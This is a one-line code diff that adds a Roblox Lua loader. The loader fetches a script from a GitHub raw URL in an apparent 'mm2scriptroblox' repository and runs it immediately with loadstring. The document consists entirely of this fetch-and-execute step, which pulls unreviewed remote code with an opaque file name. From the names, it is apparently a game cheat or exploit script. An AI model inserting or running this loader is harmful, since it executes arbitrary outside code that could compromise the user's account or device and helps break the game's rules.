@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/y9nxx/mm2scriptroblox/refs/heads/main/d3dg6Jf8Fs3.luau"))()
